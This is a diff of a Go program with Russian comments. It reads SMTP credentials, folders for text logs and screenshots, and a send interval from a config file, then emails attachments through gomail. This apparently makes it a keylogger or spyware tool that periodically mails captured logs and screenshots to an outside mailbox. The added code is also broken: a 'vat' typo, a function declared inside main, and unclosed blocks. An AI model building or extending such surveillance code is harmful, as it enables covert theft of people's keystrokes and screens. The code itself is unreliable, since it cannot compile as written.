@@ -25,6 +25,9 @@ var fld_key string
 var fld_scr string
 var email_relay int
 var is_scr bool
+vat time_now_str string
+vat time_now_int int
+var time_zip string
 func main() {
 
 file, _ := os.Open("config") //имя файла, откуда читаем настройки
@@ -38,33 +41,54 @@ fmt.Print("\n")
 
 email := strings.Split(arr[0], ":") 		// Email login
 pass := strings.Split(arr[1], ":")		// Email password
+	
 server := strings.Split(arr[2], ":")		// SMTP-сервер
 port_str := strings.Split(arr[3], ":")		// SMTP-порт
 port := port_str[1]				// SMTP-порт - адский конверт в int
 port_int, _ := strconv.ParseInt(port, 10, 0)	// SMTP-порт - адский конверт в int
 port_int1 = int(port_int)			// !SMTP-порт - адский конверт в int
+	
 to := strings.Split(arr[4], ":")		// E-mail получателя
 sbj := strings.Split(arr[5], ":")		// Тема письма
 body := strings.Split(arr[6], ":")		// Тело письма
+	
 fld_key := strings.Split(arr[7], ":")		// Папка хранения текстовых логов
 fld_scr := strings.Split(arr[8], ":")		// Папка хранения скриншотов
+	
 email_relay := strings.Split(arr[9], ":")	// Задержка отправки почты в секундах, по умолчанию 14400
 email_relay_int1 := email_relay[1]		// Задержка отправки почты в секундах - адский конверт в int
 email_relay_int2, _ := strconv.ParseInt(email_relay_int1, 10, 0) // Задержка отправки почты в секундах - адский конверт в int
 email_relay_int = int(email_relay_int2)		// !Задержка отправки почты в секундах - адский конверт в int
 is_scr := strings.Split(arr[10], ":")		// Делать ли скриншоты - если 1 - да, 0 - нет
 defer file.Close()
+	
+func getCurrentDate() string {
+	time_now_str := time.Date(2009, time.November, 10, 23, 0, 0, 0, time.UTC)
+}
+fmt.Println(getCurrentDate())
+fmt.Printf("Дата и время - %s\n", time_now_str.Local())
+//письмо
+
+m := gomail.NewMessage()
+m.SetHeader("From", email[1])
+m.SetHeader("To", to[1], email[1]) //!!!!!!!!!!!!!!
+m.SetAddressHeader("", "", "")
+m.SetHeader("Subject", sbj[1])
+m.SetBody("text/html", body[1])
+m.Attach(time_zip[1])
+
+//отправка
+
+d := gomail.NewDialer(server[1], port_int1, email[1], pass[1])
+
+// Send the email to Bob, Cora and Dan.
+if err := d.DialAndSend(m); err != nil {
+panic(err)
 
 /* const (
-	// log file name.
-	logFileName = "file.log"
+	// log file name по дням и папки
 	// Save photo interval.
 	savePhotoInterval = 10
-	// Send email interval.
-	sendEmailInterval = 15
-
-	// Need to save screen shots?
-	isScreenShot = true
 )
 */
 // Get file contents as string.
@@ -74,25 +98,6 @@ func fileGetContents(filename string) string {
 	return string(buf)
 }
 
-// Send email with attachment.
-func sendEmailWithAttach(header, body string, attachPathArr []string) {
-	m := gomail.NewMessage()
-	m.SetHeader("From", emailLogin)
-	m.SetHeader("To", emailLogin, emailLogin)
-	m.SetAddressHeader("", "", "")
-	m.SetHeader("Subject", header)
-	m.SetBody("text/html", body)
-
-	for _, attach := range attachPathArr {
-		m.Attach(attach)
-	}
-
-	d := gomail.NewDialer("smtp.mail.ru", 465, emailLogin, emailPass)
-
-	if err := d.DialAndSend(m); err != nil {
-		panic(err)
-	}
-}
 
 // Send email.
 func sendEmail(header, body string) {
@@ -110,6 +115,7 @@ func sendEmail(header, body string) {
 	}
 }
 */
+	/*
 // Get current date format as DD.MM.YYYY
 func getCurrentDate() string {
 	return time.Now().Format("02.01.2006")
@@ -119,7 +125,7 @@ func getCurrentDate() string {
 func getCurrentTime() string {
 	return time.Now().Local().Format("15:04:05")
 }
-
+*/
 // Write "" into file.
 func clearFileContents(path string) {
 	// open file using READ & WRITE permission
